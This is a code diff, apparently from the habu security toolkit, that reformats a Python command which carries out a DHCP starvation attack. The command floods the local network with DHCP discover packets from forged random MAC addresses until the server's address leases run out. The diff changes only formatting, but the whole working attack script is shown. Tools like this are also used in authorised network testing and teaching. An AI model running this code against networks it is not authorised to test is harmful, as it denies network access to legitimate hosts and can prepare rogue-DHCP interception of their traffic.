@@ -1,22 +1,22 @@
 #!/usr/bin/env python3
 
 import logging
-
 from time import sleep
 
 import click
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-from habu.lib.iface import search_iface
 from scapy.all import BOOTP, DHCP, IP, UDP, Ether, RandMAC, conf, srp
+
+from habu.lib.iface import search_iface
 
 
 @click.command()
-@click.option('-i', 'iface', default=None, help='Interface to use')
-@click.option('-t', 'timeout', default=1, help='Time (seconds) to wait for responses')
-@click.option('-s', 'sleeptime', default=0, help='Time (seconds) between requests')
-@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose output')
+@click.option("-i", "iface", default=None, help="Interface to use")
+@click.option("-t", "timeout", default=1, help="Time (seconds) to wait for responses")
+@click.option("-s", "sleeptime", default=0, help="Time (seconds) between requests")
+@click.option("-v", "verbose", is_flag=True, default=False, help="Verbose output")
 def cmd_dhcp_starvation(iface, timeout, sleeptime, verbose):
     """Send multiple DHCP requests from forged MAC addresses to
     fill the DHCP server leases.
@@ -37,22 +37,26 @@ def cmd_dhcp_starvation(iface, timeout, sleeptime, verbose):
     if iface:
         iface = search_iface(iface)
         if iface:
-            conf.iface = iface['name']
+            conf.iface = iface["name"]
         else:
-            logging.error('Interface {} not found. Use habu.interfaces to show valid network interfaces'.format(iface))
+            logging.error(
+                "Interface {} not found. Use habu.interfaces to show valid network interfaces".format(
+                    iface
+                )
+            )
             return False
 
     conf.checkIPaddr = False
 
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-    ip = IP(src="0.0.0.0",dst="255.255.255.255")
+    ip = IP(src="0.0.0.0", dst="255.255.255.255")
     udp = UDP(sport=68, dport=67)
-    dhcp = DHCP(options=[("message-type","discover"),"end"])
+    dhcp = DHCP(options=[("message-type", "discover"), "end"])
 
     while True:
         bootp = BOOTP(chaddr=str(RandMAC()))
         dhcp_discover = ether / ip / udp / bootp / dhcp
-        ans, unans = srp(dhcp_discover, timeout=1)      # Press CTRL-C after several seconds
+        ans, unans = srp(dhcp_discover, timeout=1)  # Press CTRL-C after several seconds
 
         for _, pkt in ans:
             if verbose:
@@ -63,5 +67,5 @@ def cmd_dhcp_starvation(iface, timeout, sleeptime, verbose):
         sleep(sleeptime)
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     cmd_dhcp_starvation()
